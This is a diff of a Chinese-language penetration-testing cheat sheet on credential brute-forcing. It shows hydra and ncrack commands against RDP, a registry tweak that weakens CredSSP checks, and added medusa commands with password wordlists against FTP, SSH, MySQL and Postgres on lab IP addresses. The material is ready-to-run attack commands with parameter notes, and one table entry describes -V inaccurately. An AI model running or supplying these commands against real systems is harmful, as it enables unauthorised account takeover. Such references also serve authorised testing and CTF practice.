@@ -45,9 +45,11 @@ hydra -l wenber -V -x 3:3:1 rdp://127.0.0.1:3389
 | -e nsr  | "n" for null password, additional checks,                                       |
 |         | "s" try login as pass                                                           |
 |         | "r" try the reverse login as pass                                               |
+
 # rdp
 
 远程桌面 要求的函数不受支持
+
 ```
 reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /t reg_dword /v AllowEncryptionOracle /d 2
 ```
@@ -63,7 +65,8 @@ hydra 192.168.50.210 rdp -l admin -p 123456 -V -F
 hydra 192.168.31.22 rdp -L /usr/share/wordlists/dirbuster/password2.txt -P /usr/share/wordlists/dirbuster/password1.txt -V -F
 ```
 
-## rdp/御剑RDP爆破工具/超级弱口令检查工具/fscan/
+## rdp/御剑 RDP 爆破工具/超级弱口令检查工具/fscan/
+
 ## rdp/ncrack 3389 rdp 爆破
 
 ```sh
@@ -74,3 +77,26 @@ ncrack -p 3389 -v -user admin -pass 123456Aa@@ 192.168.52.143
 # -T<0-5> 越高越快
 ncrack -p 3389 -v -user admin -P ./6位数字.txt 192.168.52.143 -T2 -oN output.txt
 ```
+
+# medusa
+
+```bash
+# FTP
+medusa -h 192.168.1.1 -u admin -P /top1000_password.txt -M ftp -e ns -t 10 -f -r 0 -O ./result_ftp.txt
+medusa -M ftp -h 192.168.135.121 -u zc -p top1000.txt
+# ssh
+medusa -M ssh -h 192.168.75.141 -u flag4 -P top1000.txt -V
+# mysql
+medusa -h 192.168.137.133 -u root -P /wordlist.txt -M mysql
+# postgres
+medusa -H /ip.txt -u postgres -n 5432 -P /tmp/pass.txt -e ns -M postgres -T 255 -f -O /tmp/good.txt -r 0
+```
+
+| params      | desc                                        |
+| ----------- | ------------------------------------------- |
+| -n [NUM]    | 使用非默认端口                              |
+| -e [n/s/ns] | N 意为空密码，S 意为密码与用户名相同        |
+| -t [NUM]    | 设定线程数量                                |
+| -f          | 在任何主机上找到第一个账号/密码后，停止破解 |
+| -r [NUM]    | 重试间隔时间，默认为 3 秒                   |
+| -V          | 显示版本                                    |
